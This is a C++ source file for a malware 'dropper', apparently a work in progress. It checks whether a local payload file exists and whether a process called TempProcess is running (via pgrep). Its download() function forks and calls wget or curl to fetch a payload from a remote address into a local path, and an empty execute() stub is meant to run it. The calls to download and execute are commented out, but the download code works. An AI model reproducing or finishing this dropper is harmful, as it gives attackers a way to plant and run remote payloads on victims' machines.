#include "dropper.h"

int pull()
{
	fprintf(stdout, "[Dropper called]");

	bool payloadExists = fileExists(_PayloadLocal);

	//fputs(payloadExists ? "Exists" : "Doesn't Exist", stdout);

	//if(!payloadExists)
	//  	download();

	payloadRunning();
	//fputs(payloadRunning() ? "\nIs running" : "\nIsn't running", stdout);

	//execute();

	return 0;
}

//NOTE Only checks for accessibility, not existance.
bool fileExists(std::string name)
{
	struct stat buffer;
	return (stat (name.c_str(), &buffer) == 0);
}

bool payloadRunning()
{
//	char command[64];
//	snprintf(command, 64, "pgrep %s", _ProcName);
	const char* command = "pgrep TempProcess";

	std::array<char, 128> buffer;
	std::string result;
	std::shared_ptr<FILE> pipe(popen(command, "r"), pclose);

	if(!pipe)
		throw std::runtime_error("pipe error");

//	while(!feof(pipe.get()))
//	{
		if(fgets(buffer.data(), 128, pipe.get()) != NULL)
			result += buffer.data();
//	}

	std::cout << "PID: " << result << std::endl;
	return false;
}

void download()
{
	std::vector<const char*> webclients = 
	{
			"/usr/bin/wget",
		   	"/usr/bin/curl"
	};


	for(size_t i = 0; i < webclients.size(); i++)
	{
		if(fileExists(webclients[i]))
		{
				std::cout << "Found webclient: " << webclients[i] << std::endl;
				
				int pid = fork();

				if(pid == 0)
					execl(webclients[i], "wget", 
										 (i == 0) ? "-q" : "-sS",
										 (i == 0) ? "-O" : "-o",
										 _PayloadLocal.c_str(), 
										 _PayloadRemote.c_str(),
										 NULL);

				break;
		}
	}
}

void execute()
{

}
